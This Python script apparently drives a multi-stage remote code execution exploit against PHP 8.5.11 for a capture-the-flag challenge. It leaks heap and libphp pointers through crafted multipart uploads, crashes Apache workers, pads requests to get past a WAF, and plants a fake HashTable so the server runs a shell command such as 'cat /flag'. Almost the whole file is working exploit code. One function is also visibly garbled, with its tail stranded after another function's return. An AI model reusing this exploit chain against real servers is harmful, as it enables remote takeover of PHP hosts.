#!/usr/bin/env python3
"""Mirror-only PHP 8.5.11 hybrid: cheap leaks + current bin-40 terminal.

This calibration driver deliberately accepts loopback targets only.  It uses
the under-1 MiB nested-name producer for the two disclosures, then replaces
the official exploit's over-limit large field with the same nested amplifier
while preserving its PHP 8.5.11 stage-3 pads, carrier, and fake HashTable.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import http.client
import hashlib
import importlib.util
import json
import re
import struct
import sys
import time
import urllib.parse
from pathlib import Path
from collections import Counter


CHAINETOOL = "/root/chainetool-v106/e2e"
PUBLIC_EXPLOIT = "/tmp/cfctf-3em0/exploit.py"
DTOR_OFFSET_8511 = 0x7B47A0
DTOR_PROFILE_OFFSETS = (
    ("official", 0x7B47A0),
    ("source-hybrid", 0x7EAF60),
    ("stock-minimal", 0x7AE960),
)
ZIF_SYSTEM_FROM_DTOR_8511 = -0x21B0C0
ZIF_PASSTHRU_FROM_DTOR_8511 = -0x21B0B0
HTDATA_OFFSET_8511 = 0x690D8
DEFAULT_WAF_PREAMBLE = 1_056_768
BRACE_FLAG_RE = re.compile(rb"[A-Za-z0-9_]{2,24}\{[^\r\n}]{4,256}\}")
UUID_FLAG_RE = re.compile(
    rb"\b[0-9a-fA-F]{8}-(?:[0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}\b"
)


class BackoffSignal(RuntimeError):
    """Raised after a completed bounded wave reports an edge backoff status."""

sys.path.insert(0, CHAINETOOL)

from p2s import killaboi as kb  # noqa: E402
from p2s.context import Context  # noqa: E402
from p2s.doctrine import Doctrine  # noqa: E402
from p2s.http import HttpClient, Target as ChainTarget  # noqa: E402


def load_public_exploit():
    spec = importlib.util.spec_from_file_location("php2shell_public", PUBLIC_EXPLOIT)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"cannot load {PUBLIC_EXPLOIT}")
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def _debian_dtor_candidate(dtor: int, expected=None):
    """Accept one canonical dtor pointer matching exactly one known profile."""
    if not 0x700000000000 <= dtor < 0x800000000000:
        return None
    if expected is not None and dtor != expected:
        return None
    matches = []
    for profile, offset in DTOR_PROFILE_OFFSETS:
        libphp = dtor - offset
        if libphp > 0 and libphp & 0x1FFFFF == 0:
            matches.append((profile, offset, libphp))
    if len(matches) != 1:
        return None
    profile, offset, libphp = matches[0]
    return {
        "dtor": dtor,
        "libphp": libphp,
        "profile": profile,
        "profile_offset": offset,
    }


def debian_code_candidate(cookie: bytes, geometry=None, expected=None):
    """Decode the exact 16-byte ``[16][zval_ptr_dtor]`` cookie."""
    del geometry
    if len(cookie) != 16 or struct.unpack_from("<Q", cookie, 0)[0] != 16:
        return None
    candidate = _debian_dtor_candidate(
        struct.unpack_from("<Q", cookie, 8)[0], expected
    )
    if candidate is None:
        return None
    return {**candidate, "cookie_bytes": len(cookie), "oracle": "code16-cookie"}


def debian_fatal_code_candidate(tried_bytes: int, expected=None):
    """Invert ``zend_string_safe_alloc(3, stale_len, 0)`` exactly.

    On 64-bit PHP 8.5, the allocation includes the aligned 32-byte
    ``zend_string`` header.  A stale length overlapping ``pDestructor`` thus
    reports ``tried = 3 * zval_ptr_dtor + 32``.
    """
    if tried_bytes < 32 or (tried_bytes - 32) % 3:
        return None
    candidate = _debian_dtor_candidate((tried_bytes - 32) // 3, expected)
    if candidate is None:
        return None
    return {
        **candidate,
        "tried_bytes": tried_bytes,
        "oracle": "fatal-pDestructor",
    }


def response_summary(raw: bytes) -> dict:
    head, _, body = raw.partition(b"\r\n\r\n")
    match = re.match(rb"HTTP/1\.[01] (\d{3})", head)
    headers = {}
    for line in head.split(b"\r\n")[1:]:
        name, separator, value = line.partition(b":")
        if separator:
            headers[name.decode("latin1").strip().lower()] = value.decode(
                "latin1", "replace"
            ).strip()
    status = int(match.group(1)) if match else 0
    lowered = body.lower()
    return {
        "status": status,
        "raw_bytes": len(raw),
        "body_bytes": len(body),
        "sha256": hashlib.sha256(raw).hexdigest(),
        "oom": b"Allowed memory size" in raw and b"exhausted" in raw,
        "attempt_id": headers.get("x-attempt-id", ""),
        "backoff": status in (0, 403, 429, 500, 503)
        or b"container overloaded" in lowered
        or b"try again later" in lowered
        or b"taking too long to accept" in lowered
        or b"application could be overwhelmed" in lowered
        or b"error proxying request to container" in lowered,
    }


def batch_response_summary(response) -> dict:
    body = response.body or b""
    lowered = body.lower()
    return {
        "status": response.status,
        "body_bytes": len(body),
        "body_sha256": hashlib.sha256(body).hexdigest(),
        "attempt_id": (response.headers.get("x-attempt-id") or ""),
        "backoff": response.status in (429, 503)
        or b"container overloaded" in lowered
        or b"try again later" in lowered,
        "outcome": response.outcome,
    }


def add_preamble(body: bytes, length: int) -> bytes:
    if length <= 0:
        return body
    length = max(2, length)
    marker = b"R8-PREAMBLE-"
    inert_length = length - 2
    inert = (marker * ((inert_length + len(marker) - 1) // len(marker)))[:inert_length]
    return inert + b"\r\n" + body


def compact_window_consumer(
    leak_length: int,
    boundary: bytes = kb.COOKIE_BOUNDARY,
    *,
    array_fields: int = 0,
    chain_depth: int = 0,
) -> bytes:
    """Extend the native compact heap disclosure into one bounded window."""
    if not 0x100 <= leak_length <= 0x10000:
        raise ValueError("compact leak length must be in 0x100..0x10000")
    parts = [
        kb.multipart_part(boundary, b"PHPSESSID", b"a"),
        kb.multipart_part(boundary, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
    ]
    for index in range(51):
        value = (f"v{index:04d}".encode() + b"x" * 48)[:48]
        parts.append(
            kb.multipart_part(boundary, str(1000 + index).encode(), value)
        )
    parts.append(kb.multipart_part(boundary, b"1050", b"Z" * 128))
    for index in range(array_fields):
        parent = 5 + index // 16
        child = 100 + index % 16
        parts.append(
            kb.multipart_part(
                boundary,
                f"{parent}[{child}]".encode(),
                b"x",
            )
        )
    if chain_depth:
        name = b"h000" + b"".join(
            f"[{index:02d}]".encode() for index in range(chain_depth)
        )
        parts.append(kb.multipart_part(boundary, name, b"x"))
    forged = bytearray(b"A" * 79)
    struct.pack_into("<Q", forged, 0x10, leak_length)
    forged[0x18] = ord("L")
    parts.append(kb.multipart_part(boundary, b"1999", bytes(forged)))
    return kb.finish_multipart(parts, boundary)


def cookie_from_raw(raw: bytes) -> bytes:
    head, _, _body = raw.partition(b"\r\n\r\n")
    match = re.search(rb"(?im)^Set-Cookie:\s*PHPSESSID=([^;\r\n]*)", head)
    if not match:
        return b""
    return urllib.parse.unquote_to_bytes(match.group(1).decode("latin1"))


def exact_pad_name(index: int, length: int) -> str:
    return (f"p{index:0{length - 1}d}" if length else "")[:length]


def hybrid_stage3_producer(public, shape: kb.ProducerShape) -> bytes:
    """Official stage-3 prefix followed by the cheap nested OOM amplifier."""
    parts = [
        {"name": "PHPSESSID", "data": b"a" * 19},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    for index, (name_len, value_len) in enumerate(((31, 31),) * 6):
        parts.append({
            "name": exact_pad_name(index, name_len),
            "data": b"V" * value_len,
        })
    parts.append({"name": "f", "filename": "a.txt", "data": b"A" * 64})
    for index in range(shape.count):
        nested = b"f[" + str(index).encode() + b"]" + b"[x]" * shape.depth
        parts.append({
            "name": nested.decode("ascii"),
            "filename": "",
            "data": b"",
        })
    return public.build_multipart(parts, b"S" * 17)


def official_stage3_consumer(
    public,
    htdata: int,
    zif: int,
    command: bytes,
    *,
    short_fillers: int = 2,
    zero_elements: bool = False,
    packed: bool = False,
) -> bytes:
    profile = public.PROFILES["official"]
    exploit = public.Exploit(
        public.Target("http://127.0.0.1/", verbose=False),
        command.decode("ascii"),
        profile,
        0x5996E0,
        DTOR_OFFSET_8511,
        HTDATA_OFFSET_8511,
        verbose=False,
    )
    table, _unused_ref = exploit._fake_payload(htdata, zif)
    if zero_elements or packed:
        table = bytearray(table)
        if zero_elements:
            struct.pack_into("<I", table, 0x1C, 0)
        if packed:
            flags = struct.unpack_from("<I", table, 0x08)[0]
            struct.pack_into("<I", table, 0x08, flags | 0x04)
        table = bytes(table)
    carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
    parts = [
        {"name": "PHPSESSID", "data": public.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for index in range(short_fillers):
        parts.append({"name": f"f{index:02d}", "data": b"F" * 15})
    parts.append({"name": "g00", "data": carrier})
    for index in range(15):
        parts.append({"name": f"a{index:030d}"[:31], "data": table})
    return public.build_multipart(parts, b"B" * 10)


def cheap_rotate(target, preamble: int = 0) -> dict:
    """Abort one worker with the measured 369 KiB final-body shape.

    This is a crash-only request: deliberately unmapped placeholder pointers
    prevent command execution, while the request's own nested-name OOM reaches
    the corrupted cleanup path and terminates only the prefork child.  The
    Apache master replaces it with inherited module mappings.  No health-check
    request follows because the next exploit stage must be the new worker's
    first PHP request.
    """
    body = kb.final_multipart(0x700000000000, 0x700000001000, b"R8ROTATE")
    body = add_preamble(body, preamble)
    raw = target.post(body, kb.FINAL_BOUNDARY, read_cap=65536, timeout=20.0)
    time.sleep(1.0)
    return {
        "response": response_summary(raw),
        "body": len(body),
        "expected_child_exit": len(raw) == 0,
    }


def add_frame_header(frame: bytes, name: str, value: str) -> bytes:
    head, separator, body = frame.partition(b"\r\n\r\n")
    if not separator:
        raise ValueError("malformed HTTP frame")
    return head + f"\r\n{name}: {value}\r\n\r\n".encode("ascii") + body


def terminal_wave(context: Context, producer: bytes, consumer: bytes,
                  consumers: int) -> list:
    producer_frame = kb.http_frame(
        context.target, producer, b"S" * 17, close=False
    )


def terminal_fanout(target, producer: bytes, consumer: bytes,
                    producers: int, consumers: int) -> tuple[list[bytes], list[bytes]]:
    """Fan out poison requests, then bounded consumers on independent sockets."""
    def send_producer(_index: int) -> bytes:
        return target.post(
            producer,
            b"S" * 17,
            read_cap=2 << 20,
            timeout=60.0,
            extra_headers={"Cookie": "PHPSESSID=" + "a" * 32},
        )

    with concurrent.futures.ThreadPoolExecutor(max_workers=producers) as executor:
        producer_raws = list(executor.map(send_producer, range(producers)))

    def send_consumer(_index: int) -> bytes:
        return target.post(
            consumer,
            b"B" * 10,
            read_cap=2 << 20,
            timeout=60.0,
        )

    with concurrent.futures.ThreadPoolExecutor(max_workers=consumers) as executor:
        responses = list(executor.map(send_consumer, range(consumers)))
    return producer_raws, responses


def concurrent_leak_stage(target, stage: str, *, producers: int, consumers: int,
                          rounds: int) -> dict:
    """One producer followed by a parallel independent-socket consumer fanout."""
    shape = kb.STAGES[stage]
    cookie_header = "".join(
        kb._cookie_name(index) + "=;" for index in range(kb.COOKIE_PAIRS)
    )
    last = {}
    for round_index in range(1, rounds + 1):
        producer = kb.producer_body(shape)
        consumer = kb.consumer_body(stage)
        def send_producer(_index: int) -> bytes:
            return target.post(
                producer,
                kb.COOKIE_BOUNDARY,
                read_cap=2 << 20,
                timeout=60.0,
                extra_headers={"Cookie": cookie_header},
            )

        with concurrent.futures.ThreadPoolExecutor(max_workers=producers) as executor:
            producer_raws = list(executor.map(send_producer, range(producers)))
        producer_records = [response_summary(raw) for raw in producer_raws]

        def send_consumer(_index: int) -> bytes:
            return target.post(
                consumer,
                kb.COOKIE_BOUNDARY,
                read_cap=2 << 20,
                timeout=60.0,
            )

        with concurrent.futures.ThreadPoolExecutor(max_workers=consumers) as executor:
            consumer_raws = list(executor.map(send_consumer, range(consumers)))
        consumer_records = [response_summary(raw) for raw in consumer_raws]
        if any(record["backoff"] for record in producer_records) or any(
            record["backoff"] for record in consumer_records
        ):
            raise BackoffSignal("429/503 or overload response in concurrent wave")

        cookies = [cookie_from_raw(raw) for raw in consumer_raws]
        candidate = None
        for cookie in cookies:
            found = (
                kb.heap_candidate(cookie)
                if stage == "heap"
                else kb.code_candidate(cookie)
            )
            if found is not None:
                candidate = found
                break
        last = {
            "stage": stage,
            "round": round_index,
            "producer_count": producers,
            "producer_statuses": [record["status"] for record in producer_records],
            "producer_oom_count": sum(record["oom"] for record in producer_records),
            "producer_status": producer_records[0]["status"],
            "producer_oom": any(record["oom"] for record in producer_records),
            "producer_wire": len(producer),
            "consumer_wire": len(consumer),
            "consumer_responses": len(consumer_raws),
            "consumer_statuses": [record["status"] for record in consumer_records],
            "cookie_lengths": [len(cookie) for cookie in cookies],
            "candidate": candidate,
            "transport": "parallel_independent_sockets",
        }
        if stage == "heap" and candidate is not None:
            landed = next(
                cookie for cookie in cookies if kb.heap_candidate(cookie) is not None
            )
            alignment = int(candidate.get("alignment", 0))
            groups: Counter[int] = Counter()
            values = []
            for offset in range(alignment, len(landed) - 7, 8):
                value = struct.unpack_from("<Q", landed, offset)[0]
                if 0x700000000000 <= value < 0x800000000000:
                    values.append(value)
                    groups[value & ~((1 << 21) - 1)] += 1
            last["pointer_groups"] = {
                hex(base): votes for base, votes in groups.most_common()
            }
            last["pointer_values"] = [hex(value) for value in values]
        print(
            f"  concurrent[{stage}] {round_index}/{rounds}: "
            f"producers={last['producer_statuses']} "
            f"oom={last['producer_oom_count']}/{producers} "
            f"cookies={last['cookie_lengths'][:8]}"
            + (f" -> {candidate}" if candidate else ""),
            flush=True,
        )
        if not last["producer_oom"]:
            last["reason"] = "the producer did not render a PHP memory-limit fatal"
            continue
        if candidate is not None:
            return {"found": True, "record": last}
    last.setdefault("reason", f"no {stage} disclosure in {rounds} round(s)")
    return {"found": False, "record": last}
    producer_frame = add_frame_header(
        producer_frame, "Cookie", "PHPSESSID=" + "a" * 32
    )
    frames = [producer_frame]
    frames.extend(
        kb.http_frame(
            context.target,
            consumer,
            b"B" * 10,
            close=(index == consumers - 1),
        )
        for index in range(consumers)
    )
    return kb.send_batch(
        context,
        frames,
        note="r8:terminal-wave",
        timeout=max(60.0, float(context.options.get("chain_timeout") or 60.0)),
    )


def verify_claim(target_url: str, attempt_id: str, flag: bytes) -> dict:
    """Submit only a fresh flag tied to the terminal response's attempt ID."""
    parsed = urllib.parse.urlsplit(target_url)
    if not re.fullmatch(r"[0-9a-fA-F-]{36}", attempt_id):
        return {"submitted": False, "reason": "missing or invalid terminal attempt id"}
    payload = json.dumps(
        {"attemptId": attempt_id, "flag": flag.decode("utf-8", "strict")}
    ).encode("utf-8")
    connection_class = (
        http.client.HTTPSConnection if parsed.scheme == "https" else http.client.HTTPConnection
    )
    connection = connection_class(parsed.hostname, parsed.port, timeout=30.0)
    try:
        connection.request(
            "POST",
            "/api/verify",
            body=payload,
            headers={"Content-Type": "application/json", "Content-Length": str(len(payload))},
        )
        response = connection.getresponse()
        body = response.read(1 << 20)
    finally:
        connection.close()
    document = {}
    try:
        document = json.loads(body.decode("utf-8", "replace"))
    except Exception:
        pass
    return {
        "submitted": True,
        "status": response.status,
        "verified": bool(document.get("verified")),
        "permalink": document.get("permalink"),
        "response_sha256": hashlib.sha256(body).hexdigest(),
    }


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--consumers", type=int, default=2)
    parser.add_argument("--producers", type=int, default=1)
    parser.add_argument("--terminal-consumers", type=int, default=1)
    parser.add_argument("--terminal-producers", type=int, default=1)
    parser.add_argument("--leak-rounds", type=int, default=1)
    parser.add_argument("--terminal-rounds", type=int, default=1)
    parser.add_argument("--terminal-short-fillers", type=int, default=2)
    parser.add_argument("--concurrent-leaks", action="store_true")
    parser.add_argument("--shape", choices=("heap", "code"), default="heap")
    parser.add_argument("--command", default="cat /flag")
    parser.add_argument("--no-rotate", action="store_true")
    parser.add_argument("--waf-preamble", type=int, default=0)
    parser.add_argument("--verify", action="store_true")
    parser.add_argument("--authorized-live", action="store_true")
    parser.add_argument("--out")
    args = parser.parse_args()

    parsed = urllib.parse.urlsplit(args.target)
    is_loopback = parsed.hostname in ("127.0.0.1", "localhost", "::1")
    is_live = (
        parsed.scheme == "https"
        and parsed.hostname == "php-rce.cloudflare.app"
        and parsed.port in (None, 443)
        and parsed.path == "/php/index.php"
        and not parsed.query
        and not parsed.fragment
    )
    if not is_loopback and not (is_live and args.authorized_live):
        parser.error(
            "non-loopback use is restricted to the exact public CTF URL and "
            "requires --authorized-live"
        )
    if args.authorized_live and not is_live:
        parser.error("--authorized-live is valid only for the exact public CTF URL")
    command = args.command.encode("ascii")
    if len(command) > 14:
        parser.error("official 167-byte carrier permits a 14-byte command")
    if not 1 <= args.consumers <= 15 or not 1 <= args.terminal_consumers <= 15:
        parser.error("consumer fanout must be between 1 and 15")
    if not 1 <= args.producers <= 8 or not 1 <= args.terminal_producers <= 8:
        parser.error("producer fanout must be between 1 and 8")
    if not 1 <= args.leak_rounds <= 15 or not 1 <= args.terminal_rounds <= 25:
        parser.error("leak rounds must be 1..15 and terminal rounds 1..25")
    if not 0 <= args.terminal_short_fillers <= 16:
        parser.error("terminal-short-fillers must be in 0..16")
    if args.waf_preamble < 0 or args.waf_preamble > 2 * 1024 * 1024:
        parser.error("WAF preamble must be between 0 and 2 MiB")
    if is_live and args.waf_preamble < 1_048_437:
        parser.error("live CTF requests require the measured WAF preamble")
    if is_live and command != b"cat /flag":
        parser.error("live CTF command is restricted to 'cat /flag'")

    public = load_public_exploit()
    kb.code_candidate = debian_code_candidate
    if args.waf_preamble:
        original_producer_body = kb.producer_body
        original_consumer_body = kb.consumer_body

        def preambled_producer(shape=kb.HEAP_SHAPE, boundary=kb.COOKIE_BOUNDARY):
            return add_preamble(original_producer_body(shape, boundary), args.waf_preamble)

        def preambled_consumer(stage: str, boundary=kb.COOKIE_BOUNDARY):
            return add_preamble(original_consumer_body(stage, boundary), args.waf_preamble)

        kb.producer_body = preambled_producer
        kb.consumer_body = preambled_consumer

    original_send_batch = kb.send_batch

    def guarded_send_batch(*batch_args, **batch_kwargs):
        responses = original_send_batch(*batch_args, **batch_kwargs)
        if any(batch_response_summary(response)["backoff"] for response in responses):
            raise BackoffSignal("429/503 or overload response in completed wave")
        return responses

    kb.send_batch = guarded_send_batch

    doctrine = Doctrine(pace=0.0, timeout=60.0, authorized=True)
    chain_target = ChainTarget(args.target)
    context = Context(
        target=chain_target,
        http=HttpClient(chain_target, doctrine, read_cap=2 << 20),
        doctrine=doctrine,
        options={"chain_timeout": 60.0},
    )
    geometry = {
        "dtor_low21": DTOR_OFFSET_8511 & ((1 << 21) - 1),
        "zif_from_dtor": ZIF_PASSTHRU_FROM_DTOR_8511,
    }
    result = {
        "target": args.target,
        "profile": (
            "public Cloudflare PHP CTF / stock php:8.5.11-apache"
            if is_live
            else "official php:8.5.11-apache / 128M challenge mirror"
        ),
        "consumers": args.consumers,
        "producers": args.producers,
        "terminal_consumers": args.terminal_consumers,
        "terminal_producers": args.terminal_producers,
        "leak_rounds": args.leak_rounds,
        "terminal_rounds": args.terminal_rounds,
        "terminal_short_fillers": args.terminal_short_fillers,
        "concurrent_leaks": args.concurrent_leaks,
        "stage3_shape": args.shape,
        "waf_preamble": args.waf_preamble,
        "offsets": {
            "dtor": hex(DTOR_OFFSET_8511),
            "zif": hex(0x5996E0),
            "zif_from_dtor": hex(ZIF_PASSTHRU_FROM_DTOR_8511),
            "htdata": hex(HTDATA_OFFSET_8511),
        },
        "stages": {},
        "proof": {"found": False},
    }

    started = time.monotonic()
    target = public.Target(args.target, timeout=60.0, verbose=False)
    if not args.no_rotate:
        result["stages"]["rotation_pre"] = cheap_rotate(target, args.waf_preamble)
        if result["stages"]["rotation_pre"]["response"]["backoff"]:
            result["verdict"] = "BACKOFF"
            result["elapsed_s"] = round(time.monotonic() - started, 3)
            emit(result, args.out)
            return 3
        if is_live and result["stages"]["rotation_pre"]["response"]["status"] == 403:
            result["verdict"] = "WAF_BLOCKED"
            result["elapsed_s"] = round(time.monotonic() - started, 3)
            emit(result, args.out)
            return 5

    for stage in ("heap", "code"):
        try:
            if args.concurrent_leaks:
                outcome = concurrent_leak_stage(
                    target,
                    stage,
                    producers=args.producers,
                    consumers=args.consumers,
                    rounds=args.leak_rounds,
                )
            else:
                outcome = kb.leak_stage(
                    context,
                    stage,
                    geometry=geometry,
                    consumers=args.consumers,
                    cookie_pairs=kb.COOKIE_PAIRS,
                    rounds=args.leak_rounds,
                )
        except BackoffSignal as error:
            result["verdict"] = "BACKOFF"
            result["error"] = str(error)
            result["elapsed_s"] = round(time.monotonic() - started, 3)
            emit(result, args.out)
            return 3
        result["stages"][stage] = outcome["record"]
        if not outcome["found"]:
            result["verdict"] = "LEAK_FAILED"
            result["elapsed_s"] = round(time.monotonic() - started, 3)
            emit(result, args.out)
            return 2
        if not args.no_rotate:
            result["stages"][f"rotation_after_{stage}"] = cheap_rotate(
                target, args.waf_preamble
            )
            if result["stages"][f"rotation_after_{stage}"]["response"]["backoff"]:
                result["verdict"] = "BACKOFF"
                result["elapsed_s"] = round(time.monotonic() - started, 3)
                emit(result, args.out)
                return 3
            if (
                is_live
                and result["stages"][f"rotation_after_{stage}"]["response"]["status"]
                == 403
            ):
                result["verdict"] = "WAF_BLOCKED"
                result["elapsed_s"] = round(time.monotonic() - started, 3)
                emit(result, args.out)
                return 5

    heap = result["stages"]["heap"]["candidate"]["heap"]
    dtor = result["stages"]["code"]["candidate"]["dtor"]
    zif = dtor + ZIF_PASSTHRU_FROM_DTOR_8511
    htdata = heap + HTDATA_OFFSET_8511
    result["addresses"] = {
        "heap": hex(heap),
        "dtor": hex(dtor),
        "libphp": hex(dtor - DTOR_OFFSET_8511),
        "zif_passthru": hex(zif),
        "htdata": hex(htdata),
    }

    stage3_shape = kb.HEAP_SHAPE if args.shape == "heap" else kb.CODE_SHAPE
    producer = hybrid_stage3_producer(public, stage3_shape)
    consumer = official_stage3_consumer(
        public,
        htdata,
        zif,
        command,
        short_fillers=args.terminal_short_fillers,
    )
    producer = add_preamble(producer, args.waf_preamble)
    consumer = add_preamble(consumer, args.waf_preamble)
    result["wire"] = {"stage3_producer_body": len(producer), "stage3_consumer_body": len(consumer)}

    flag_match = None
    proof_raw = None
    result["stages"]["terminal_waves"] = []
    consumer_raws = []
    for round_index in range(1, args.terminal_rounds + 1):
        producer_raws, consumer_raws = terminal_fanout(
            target, producer, consumer,
            args.terminal_producers, args.terminal_consumers
        )
        wave = {
            "round": round_index,
            "producers": [response_summary(raw) for raw in producer_raws],
            "consumers": [response_summary(raw) for raw in consumer_raws],
        }
        result["stages"]["terminal_waves"].append(wave)
        if any(
            record["backoff"]
            for record in wave["producers"] + wave["consumers"]
        ):
            result["verdict"] = "BACKOFF"
            result["elapsed_s"] = round(time.monotonic() - started, 3)
            emit(result, args.out)
            return 3
        for raw in consumer_raws:
            _head, _, body = raw.partition(b"\r\n\r\n")
            # Public solve evidence shows that this challenge may return a bare
            # UUID rather than a conventional prefix{...} flag.  Search only
            # the response body so the similarly formatted X-Attempt-ID header
            # can never be mistaken for command output.
            candidate = BRACE_FLAG_RE.search(body) or UUID_FLAG_RE.search(body)
            if candidate:
                flag_match = candidate
                proof_raw = raw
                break
        if flag_match:
            break
    if flag_match:
        flag = flag_match.group(0)
        result["proof"] = {
            "found": True,
            "class": "same-response command output",
            "flag_sha256": hashlib.sha256(flag).hexdigest(),
            "flag_bytes": len(flag),
        }
        result["verdict"] = "PROVEN"
        if args.verify:
            attempt_id = response_summary(proof_raw)["attempt_id"]
            result["verification"] = verify_claim(args.target, attempt_id, flag)
            if result["verification"].get("verified"):
                result["verdict"] = "VERIFIED"
    else:
        result["verdict"] = "NO_PROOF"
        previews = [
            raw.partition(b"\r\n\r\n")[2][:256].decode("utf-8", "replace")
            for raw in consumer_raws
        ]
        result["proof"]["body_previews"] = previews
    result["elapsed_s"] = round(time.monotonic() - started, 3)
    emit(result, args.out)
    return 0 if result["verdict"] in ("PROVEN", "VERIFIED") else 1


def emit(result: dict, destination: str | None) -> None:
    rendered = json.dumps(result, indent=2, sort_keys=True)
    print(rendered, flush=True)
    if destination:
        Path(destination).write_text(rendered + "\n", encoding="utf-8")


if __name__ == "__main__":
    raise SystemExit(main())
